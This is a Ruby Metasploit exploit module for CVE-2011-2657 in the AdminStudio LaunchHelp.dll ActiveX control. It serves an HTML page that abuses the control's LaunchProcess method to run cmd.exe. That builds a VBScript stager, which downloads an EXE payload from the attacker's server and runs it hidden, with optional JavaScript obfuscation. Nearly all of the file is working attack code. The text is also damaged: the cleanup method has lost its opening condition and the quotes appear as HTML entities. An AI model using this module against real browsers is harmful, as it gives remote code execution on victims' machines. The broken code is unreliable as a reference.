# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AdminStudio LaunchHelp.dll ActiveX Arbitrary Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in AdminStudio LaunchHelp.dll ActiveX control. The
        LaunchProcess function found in LaunchHelp.HelpLauncher.1 allows remote attackers to run
        arbitrary commands on the victim machine. This module has been successfully tested with the
        ActiveX installed with AdminStudio 9.5, which also comes with Novell ZENworks Configuration
        Management 10 SP2, on IE 6 and IE 8 over Windows XP SP 3.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
          [
            &#039;rgod&#039;, # Vulnerability discovery
            &#039;juan&#039; # Metasploit module
          ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2011-2657&#039; ],
          [ &#039;OSVDB&#039;, &#039;76700&#039;],
          [ &#039;BID&#039;, &#039;50274&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-318/&#039; ],
          [ &#039;URL&#039;, &#039;http://www.novell.com/support/viewContent.do?externalId=7009570&sliceId=1&#039; ],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1024,
          &#039;BadChars&#039; => "\x00",
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # LaunchHelp.dll 9.5.0.0
          [ &#039;Windows Universal&#039;,  {} ],
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 19 2011&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;WINDOWSTEMP&#039;, [ true, "The Windows temporal folder.", "C:/Windows/Temp" ]),
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false]),
      ], self.class)
  end

  def on_new_session(client)
      print_error("The vbs stager and exe payload must be removed manually.")
      return
    end

    # stdapi must be loaded before we can use fs.file
    client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

    begin
      print_status("Deleting the vbs payload \"#{@stager_name}\" ...")
      client.fs.file.rm("#{@temp_folder}/#{@stager_name}")
      print_good("The vbs stager has been deleted successfully")
      print_status("The exe payload #{@temp_folder}/#{@payload_name}.exe must be removed manually")
    rescue ::Exception => e
      print_error("Problems while the clenaup")
      print_status("The vbs stager #{@temp_folder}/#{@stager_name} must be removed manually")
      print_status("The exe payload #{@temp_folder}/#{@payload_name}.exe must be removed manually")
      print_error("Exception: #{e.inspect}")
      return
    end
  end

  # Stager wrote by sinn3r to avoid problems when echoing the vbs cmdstager too many times.
  # See "real_arcade_installerdlg.rb" for more information.
  def build_vbs(url)
    name_xmlhttp = rand_text_alpha(2)
    name_adodb = rand_text_alpha(2)

    tmp = "#{@temp_folder}/#{@stager_name}"

    vbs = "echo Set #{name_xmlhttp} = CreateObject(\"Microsoft.XMLHTTP\") "
    vbs << ": #{name_xmlhttp}.open \"GET\",\"http://#{url}\",False : #{name_xmlhttp}.send"
    vbs << ": Set #{name_adodb} = CreateObject(\"ADODB.Stream\") "
    vbs << ": #{name_adodb}.Open : #{name_adodb}.Type=1 "
    vbs << ": #{name_adodb}.Write #{name_xmlhttp}.responseBody "
    vbs << ": #{name_adodb}.SaveToFile \"#{@temp_folder}/#{@payload_name}.exe\",2 "
    vbs << ": CreateObject(\"WScript.Shell\").Run \"#{@temp_folder}/#{@payload_name}.exe\",0 >> #{tmp}"
    return vbs
  end

  def exploit
    @payload_name = rand_text_alpha(4)
    @temp_folder = datastore[&#039;WINDOWSTEMP&#039;]
    @stager_name = rand_text_alpha(6) + ".vbs"
    super
  end

  def on_request_uri(cli, request)

    agent = request.headers[&#039;User-Agent&#039;]

    # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
    if not agent =~ /MSIE/
      print_error("Browser not supported: #{agent}")
      send_not_found(cli)
      return
    end

    if request.uri =~ /\.exe/
      print_status("Sending payload EXE")
      return if ((p=regenerate_payload(cli)) == nil)
      data = generate_payload_exe( {:code=>p.encoded} )
      send_response(cli, data, {&#039;Content-Type&#039; => &#039;application/octet-stream&#039;} )
      return
    end

    # Payload&#039;s URL
    payload_src = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address(cli.peerhost) : datastore[&#039;SRVHOST&#039;]
    payload_src << ":" << datastore[&#039;SRVPORT&#039;] << get_resource() + "/" + @payload_name + ".exe"

    # Create the stager (download + execute payload)
    stager = build_vbs(payload_src)

    js = <<-JS
    var actvx = new ActiveXObject(&#039;LaunchHelp.HelpLauncher.1&#039;);
    actvx.LaunchProcess("cmd.exe", &#039;/c #{stager}&#039;);
    actvx.LaunchProcess("cmd.exe", "/c start #{@temp_folder}/#{@stager_name}");
    JS

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    html = <<-EOS
    <html>
    <body>
    <script>
    #{js}
    </script>
    </body>
    </html>
    EOS

    # Remove extra tabs
    html = html.gsub(/^\t\t/, "")

    print_status("Sending #{self.name}")
    send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
  end
end



